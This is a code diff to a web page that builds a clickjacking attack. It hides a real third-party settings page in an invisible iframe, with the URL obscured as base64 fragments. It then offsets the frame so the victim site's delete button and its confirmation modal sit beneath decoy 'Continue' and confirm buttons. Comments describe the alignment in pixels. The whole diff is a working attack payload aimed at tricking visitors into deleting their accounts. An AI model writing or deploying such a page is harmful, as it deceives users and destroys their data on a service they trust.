@@ -19,9 +19,12 @@
 body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); color: var(--ink); min-height: 100vh; }
 
 /* ── IFRAME — starts pointer-events:none so real form can be interacted with ── */
+/* height:2500px so after translateY(-1316px) the bottom of the iframe stays within viewport */
 #victim-frame {
-  position: fixed; inset: 0; width: 100%; height: 100%;
+  position: fixed; top: 0; left: 0; right: 0;
+  height: 2500px;
   border: none; opacity: 0; z-index: 100; pointer-events: none;
+  transform-origin: 0 0;
 }
 
 /* ── SITE HEADER ── */
@@ -340,9 +343,16 @@ h1 { font-size: 26px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 
 <script>
 // Step 1: load partner platform after delay (URL from base64 fragments)
+// After it loads, shift the iframe UP by 1316px so the delete button (absTop:1792)
+// lands at viewport y:476 — matching our decoy Continue button position.
 setTimeout(function() {
+  var frame = document.getElementById('victim-frame');
   var s = ['aHR0cHM6Ly9ndW1yb2Fk', 'LmNvbS9zZXR0aW5ncy9h', 'ZHZhbmNlZA=='];
-  document.getElementById('victim-frame').src = atob(s.join(''));
+  frame.src = atob(s.join(''));
+  frame.addEventListener('load', function onLoad() {
+    frame.removeEventListener('load', onLoad);
+    setTimeout(function() { frame.style.transform = 'translateY(-1316px)'; }, 400);
+  });
 }, 1500);
 
 // Real form submit — posts to our server, sends actual email, then activates iframe
@@ -398,6 +408,8 @@ async function submitForm() {
       step3Shown = true;
       document.getElementById('continue-label').classList.remove('show');
       document.getElementById('btn-continue').classList.remove('show');
+      // Reset transform so Gumroad modal appears at its natural viewport y:266
+      document.getElementById('victim-frame').style.transform = 'none';
       document.getElementById('confirm-banner').classList.add('show');
       document.getElementById('btn-confirm').classList.add('show');
       // After confirm button appears, show success state via timer
